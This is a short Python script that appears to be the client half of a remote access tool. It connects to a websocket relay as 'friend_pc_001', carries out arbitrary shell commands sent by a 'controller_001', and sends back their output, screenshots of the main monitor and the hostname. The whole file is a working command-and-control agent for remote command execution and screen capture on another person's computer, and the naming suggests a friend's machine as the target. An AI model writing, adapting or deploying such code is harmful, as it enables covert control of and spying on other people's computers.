import asyncio
import websockets
import json
import subprocess
import socket
import os

import sys
RELAY_URL = sys.argv[1] if len(sys.argv) > 1 else "ws://localhost:8765"
CLIENT_ID = "friend_pc_001"
CONTROLLER_ID = "controller_001"

async def handle_command(command):
    try:
        if command["type"] == "shell":
            result = subprocess.run(command["cmd"], shell=True, capture_output=True, text=True, timeout=30)
            return {"type": "result", "output": result.stdout + result.stderr, "code": result.returncode}
        elif command["type"] == "screenshot":
            import mss
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                output = "screen.png"
                sct.shot(mon=monitor, output=output)
                with open(output, "rb") as f:
                    import base64
                    img_data = base64.b64encode(f.read()).decode()
                return {"type": "screenshot", "data": img_data}
        elif command["type"] == "ping":
            return {"type": "pong", "hostname": socket.gethostname()}
    except Exception as e:
        return {"type": "error", "message": str(e)}

async def main():
    print(f"[*] Connecting to relay as {CLIENT_ID}...")
    async with websockets.connect(RELAY_URL) as ws:
        await ws.send(json.dumps({"type": "register", "id": CLIENT_ID}))
        print("[*] Connected. Waiting for commands...")
        while True:
            try:
                msg = await ws.recv()
                data = json.loads(msg)
                if data.get("to") == CLIENT_ID:
                    print(f"[*] Received command: {data.get('type')}")
                    response = await handle_command(data)
                    response["to"] = data.get("from")
                    response["from"] = CLIENT_ID
                    await ws.send(json.dumps(response))
            except Exception as e:
                print(f"[!] Error: {e}")
                await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())

